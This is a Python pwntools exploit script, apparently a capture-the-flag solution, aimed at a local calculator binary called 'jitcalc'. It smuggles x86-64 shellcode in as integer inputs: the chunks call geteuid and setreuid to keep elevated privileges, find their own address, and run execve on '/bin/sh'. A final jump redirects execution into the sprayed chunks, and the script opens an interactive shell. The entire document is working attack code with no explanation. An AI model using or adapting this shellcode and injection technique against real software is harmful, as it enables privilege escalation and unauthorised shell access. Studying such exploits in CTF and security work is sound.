from pwn import *

context.update(arch='amd64', log_level='info')

# 100% Math-Verified PIC Shellcode
chunks = [
    # geteuid() -> rax
    b"\x6a\x6b\x58\x0f\x05\x90\xeb\x05",  
    
    # setreuid(euid, euid)
    b"\x48\x89\xc7\x48\x89\xc6\xeb\x05",  
    
    # setreuid()
    b"\x6a\x71\x58\x0f\x05\x90\xeb\x05",  
    
    # Zero out RSI and RDX for execve
    b"\x31\xf6\x31\xd2\x90\x90\xeb\x05",  
    
    # Bypass PIE
    b"\xe8\x00\x00\x00\x00\x5f\xeb\x05",  
    
    # Point RDI to the string
    b"\x48\x83\xc7\x22\x6a\x3b\xeb\x05",  
    
    # execve
    b"\x58\x0f\x05\x90\x90\x90\xeb\x05",  
    
    # The String Target
    b"/bin/sh\x00"                         
]

def attack():
    p = process('./jitcalc')

    p.recvuntil(b"how many numbers you want to add?\n")
    p.sendline(b"297")

    for i, chunk in enumerate(chunks):
        p.recvuntil(f"insert number {i+1}\n".encode())
        val = u64(chunk)
        p.sendline(str(val).encode())

    for i in range(len(chunks), 296):
        p.recvuntil(f"insert number {i+1}\n".encode())
        p.sendline(b"0")

    jmp_back = b"\xe9\xf3\xf0\xff\xff\x00\x00\x00"
    
    p.recvuntil(b"insert number 297\n")
    p.sendline(str(u64(jmp_back)).encode())

    p.interactive()

if __name__ == "__main__":
    attack()